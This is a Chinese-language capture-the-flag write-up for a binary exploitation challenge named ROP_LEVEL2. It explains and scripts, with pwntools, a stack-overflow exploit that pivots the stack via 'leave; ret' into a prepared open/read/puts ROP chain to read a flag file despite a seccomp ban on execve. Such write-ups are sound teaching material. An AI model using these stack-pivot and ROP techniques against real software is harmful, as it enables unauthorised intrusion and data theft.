# ROP_LEVEL2

## 题目简述

程序通过 seccomp 禁止 `execve`，主函数又只有较短的栈溢出空间，无法直接布置完整 ROP 链。程序启动时会先向全局可写区读入较长数据，因此可把完整 ORW 链放在那里，再用 `leave; ret` 完成栈迁移，依次执行 `open`、`read` 和 `puts` 读取 flag。

## 解题过程

题目中的关键地址为：

```python
leave_ret = 0x40090d
pop_rsi = 0x400a41       # pop rsi; pop r15; ret
pop_rdi = 0x400a43       # pop rdi; ret
pivot_rbp = 0x601098
io_buf = 0x601300
```

`pop rsi` 后还会弹出一次 `r15`，所以每次设置 `rsi` 后都要补一个占位值。第一阶段把长链写进全局缓冲区。链的动作依次是：把 `./flag\x00` 读到 `io_buf`；以只读方式打开文件；从官方远端所用的文件描述符 `4` 读取内容；最后用 `puts` 输出。

```python
from pwn import *

elf = ELF("./ROP_LEVEL2", checksec=False)
io = process(elf.path)

chain = flat(
    pop_rsi, io_buf, 0, elf.plt["read"],
    pop_rdi, io_buf,
    pop_rsi, 0, 0,
    elf.plt["open"],
    pop_rdi, 4,
    pop_rsi, io_buf, io_buf,
    elf.plt["read"],
    pop_rdi, io_buf,
    elf.plt["puts"],
)
io.sendline(chain)
```

第二次输入发生栈溢出。填满 `0x50` 字节后，把保存的 `rbp` 改为全局 ROP 链前 8 字节的位置，把返回地址改成 `leave; ret`：

```python
payload = b"A" * 0x50
payload += p64(pivot_rbp)
payload += p64(leave_ret)
io.sendline(payload)

io.sendline(b"./flag\x00")
io.interactive()
```

`leave` 等价于 `mov rsp, rbp; pop rbp`，随后 `ret` 从全局区取出第一条 gadget，长链因此开始执行。文件描述符并不是协议常量；官方实例使用 `4`，本地复现若进程未额外占用描述符，应结合调试结果改成 `3` 或实际返回值。

## 方法总结

- 核心技巧：短栈溢出只负责迁移，完整 ORW 链预先放在 `.bss` 等可写区。
- 关键细节：多弹栈 gadget 要补齐占位值，`leave; ret` 的目标应指向伪 `rbp`，而不是直接指向第一条 gadget。
- 复用要点：seccomp 禁止 `execve` 时优先检查 `open/read/write` 或 `open/read/puts`；同时验证文件描述符，不能把示例中的 `3`、`4` 当成固定值。
